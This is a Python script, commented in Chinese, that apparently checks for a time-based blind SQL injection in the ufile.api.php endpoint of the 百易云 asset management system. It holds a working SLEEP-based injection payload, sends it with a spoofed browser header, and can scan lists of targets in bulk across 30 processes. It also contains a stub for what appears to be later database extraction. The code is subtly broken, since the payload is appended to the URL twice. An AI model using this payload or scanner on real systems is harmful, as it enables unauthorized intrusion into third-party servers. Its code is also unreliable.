import requests
import datetime
from multiprocessing import Pool
import time
import argparse

headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=0, i'
}

def main():
    argparser = argparse.ArgumentParser("百易云资产管理运营系统ufile.api.php SQL注入漏洞检测工具")
    argparser.add_argument("-u", "--url",dest="target",help="请输入url")
    argparser.add_argument("-f", "--file",dest="file",help="批量检测")
    arg=ae=argparser.parse_args()
    url=arg.target
    file=arg.file
    targets=[]
    if url:
        check(url)
    elif file:
        try:
            with open(file, "r", encoding="utf-8") as f:
                target = f.readlines()
                for target in target:
                    if "http" in target:
                        target = target.strip()
                        targets.append(target)
                    else:
                        target = "http://" + target
                        targets.append(target)
        except Exception as e:
            print("[文件错误！]")
        pool = Pool(processes=30)
        pool.map(check,targets)

def check(target):
    url = f"{target}/api/file/ufile.api.php"  # 改url
    payload = "?act=filedel&fid=1 AND (SELECT 7357 FROM (SELECT(SLEEP(1)))UPCw)"  # 改闭合
    url = url + payload
    time1 = datetime.datetime.now()
    r = requests.get(url + payload, headers=headers)
    time2 = datetime.datetime.now()
    sec = (time2 - time1).seconds
    try:
        if sec >= 2:
            print(f"[*]{target}存在sql注入")
        else:
            print(f"[!]{target}不存在sql注入")
    except Exception as e:
        print(f"[ERROR!]{target}")

def database_len(target):
    pass


if __name__ == '__main__':
    main()
